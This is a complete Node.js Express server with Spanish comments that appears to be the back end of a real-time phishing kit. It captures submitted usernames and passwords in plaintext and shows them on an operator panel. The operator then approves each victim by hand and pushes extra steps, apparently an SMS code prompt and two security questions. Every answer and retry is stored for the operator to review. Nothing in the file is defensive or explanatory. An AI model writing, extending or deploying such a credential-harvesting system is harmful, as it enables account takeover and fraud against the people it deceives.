const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// Datos en memoria - para simplificar, usa base de datos si puedes
let solicitantes = []; // Usuarios con estado y sessionId
let preguntasPorUsuario = []; // Preguntas asignadas a usuarios específicos
let respuestasPorUsuario = []; // Respuestas e intentos guardados

let nextSolicitanteId = 1;

// Ruta para recibir login y crear solicitud pendiente
app.post('/', (req, res) => {
  const { usr, clv, device, id, website } = req.body;

  if (website) return res.status(400).json({ success: false, error: 'Actividad sospechosa detectada.' });
  if (!usr || !clv) return res.status(400).json({ success: false, error: 'Faltan datos de usuario o clave.' });

  const sessionId = id || Date.now().toString();

  solicitantes.push({
    id: nextSolicitanteId++,
    usuario: usr,
    clave: clv,
    estado: 'pendiente',
    fecha: new Date(),
    device,
    sessionId
  });

  console.log("Solicitud login recibida:", usr);

  res.json({ success: true, sessionId });
});

// Panel lee todas las solicitudes
app.get('/solicitantes', (req, res) => res.json(solicitantes));

// Actualizar estado y asignar preguntas al aprobar
app.put('/solicitantes/:id', (req, res) => {
  const id = +req.params.id;
  const { estado, preguntas } = req.body;
  const s = solicitantes.find(sol => sol.id === id);
  if (!s) return res.status(404).json({ error: 'No encontrado' });

  s.estado = estado || s.estado;

  if (estado === 'aprobado' && preguntas && preguntas.length === 2) {
    // Asigna preguntas solo cuando apruebas y envías las 2 preguntas específicas
    const existente = preguntasPorUsuario.find(pu => pu.sessionId === s.sessionId);
    if (existente) {
      existente.preguntas = preguntas;
    } else {
      preguntasPorUsuario.push({ sessionId: s.sessionId, preguntas });
    }
  }

  res.json(s);
});

// Ruta para que frontend compruebe estado y controle pasos
app.get('/api/verificar', (req, res) => {
  const sessionId = req.query.id;
  if (!sessionId) return res.status(400).json({ error: 'Falta id de sesión' });

  const solicitud = solicitantes.find(s => s.sessionId === sessionId);
  if (!solicitud) return res.json({ estado: 'falso' });

  if (solicitud.estado === 'pendiente') return res.json({ estado: 'mostrar_sms' });
  if (solicitud.estado === 'rechazado') return res.json({ estado: 'rechazado' });

  if (solicitud.estado === 'aprobado') {
    const asignacion = preguntasPorUsuario.find(pu => pu.sessionId === sessionId);
    if (asignacion && asignacion.preguntas.length === 2) {
      return res.json({ estado: 'mostrar_preguntas_usuario' });
    } else {
      // Sin preguntas asignadas aún, espera
      return res.json({ estado: 'pendiente' });
    }
  }

  return res.json({ estado: 'falso' });
});

// Ruta para que frontend pida las preguntas que debe responder el usuario
app.get('/api/preguntas-usuario', (req, res) => {
  const sessionId = req.query.id;
  if (!sessionId) return res.status(400).json({ error: 'Falta id de sesión' });
  const asignacion = preguntasPorUsuario.find(pu => pu.sessionId === sessionId);
  if (!asignacion) return res.json({ preguntas: [] });
  res.json({ preguntas: asignacion.preguntas });
});

// Ruta para guardar respuestas del usuario (puede ser varios intentos)
app.post('/api/respuestas-usuario', (req, res) => {
  const { sessionId, respuestas } = req.body;

  if (!sessionId || !respuestas || !Array.isArray(respuestas) || respuestas.length !== 2) {
    return res.status(400).json({ error: 'Datos incompletos o incorrectos' });
  }

  let registro = respuestasPorUsuario.find(r => r.sessionId === sessionId);
  if (!registro) {
    registro = { sessionId, intentos: [] };
    respuestasPorUsuario.push(registro);
  }

  registro.intentos.push({ respuestas, fecha: new Date() });

  res.json({ message: 'Respuestas guardadas' });
});

// Ver respuestas ingresadas por usuario (para que tú las revises)
app.get('/api/respuestas-usuario', (req, res) => {
  const sessionId = req.query.id;
  if (!sessionId) return res.status(400).json({ error: 'Falta id de sesión' });
  const registro = respuestasPorUsuario.find(r => r.sessionId === sessionId);
  res.json(registro || { intentos: [] });
});

// Servir archivos estáticos (HTML, CSS, JS)
app.use(express.static(path.join(__dirname)));

// Servir panel principal
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'panel.html'));
});

// Puerto y servidor
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor escuchando en puerto ${PORT}`));
